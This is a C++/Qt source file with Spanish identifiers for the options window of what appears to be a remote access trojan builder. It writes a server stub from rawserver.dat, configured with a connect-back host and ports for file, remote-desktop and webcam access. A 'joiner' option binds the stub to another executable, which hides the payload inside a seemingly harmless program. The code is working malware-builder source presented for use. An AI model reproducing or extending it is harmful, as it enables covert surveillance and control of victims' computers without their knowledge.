/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "ventanaopciones.h"
#include "ui_ventanaopciones.h"

ventanaOpciones::ventanaOpciones(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::ventanaOpciones)
{
    ui->setupUi(this);
    connect(ui->botonCrearServidor,SIGNAL(clicked()),this,SLOT(crearServidor()));
    connect(ui->checkJoiner,SIGNAL(clicked()),this,SLOT(activarJoiner()));
    connect(ui->botonExaminar,SIGNAL(clicked()),this,SLOT(examinar()));
}

ventanaOpciones::~ventanaOpciones()
{
    delete ui;
}

void ventanaOpciones::changeEvent(QEvent *e)
{
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ui->retranslateUi(this);
        break;
    default:
        break;
    }
}
void ventanaOpciones::examinar()
{
    ui->textoEjecutable->setText(QFileDialog::getOpenFileName(this,"Abrir ejecutable"));
}
void ventanaOpciones::activarJoiner()
{
    if(ui->checkJoiner->isChecked()) {
        ui->botonExaminar->setEnabled(true);
        ui->textoEjecutable->setEnabled(true);
        ui->label_9->setEnabled(true);
    }
    else
    {
        ui->botonExaminar->setEnabled(false);
        ui->textoEjecutable->setEnabled(false);
        ui->label_9->setEnabled(false);
    }
}
void ventanaOpciones::crearServidor()
{
    if (QFile::exists("rawserver.dat"))
    {
        QByteArray datos;
        QFile rawserver;
        QFile server;
        datos = "|@|" + ui->textoHost->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuerto->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoArchivos->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoEscritorio->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoWebcam->text().toLatin1() + "|@|";
        datos = datos + ui->textoTiempo->text().toLatin1() + "|@|";
        datos = datos + ui->textoAlias->text().toLatin1() + "|@|";
        rawserver.setFileName("rawserver.dat");
        server.setFileName(QFileDialog::getSaveFileName(this,"Nombre del servidor"));
        rawserver.open(QIODevice::ReadOnly);
        server.open(QIODevice::WriteOnly);
        server.write(rawserver.readAll());
        if (ui->checkJoiner->isChecked())
        {
            QFile adjunto;
            QString tamano;
            adjunto.setFileName(ui->textoEjecutable->text());
            adjunto.open(QFile::ReadOnly);
            tamano.setNum(adjunto.size());
            datos = datos + "unido|@|" + tamano.toLatin1() + "|@|";
            server.write(adjunto.readAll());
        }
        else
        {
            datos = datos + "nounido|@|0|@|";
        }
        datos = datos + ui->textoNombre->text().toLatin1() + "|@|";
        server.write(datos,1024);
    }
    else
    {
        util.ventanaEmergente("No se ha podido encontrar el archivo rawserver.dat");
    }
}
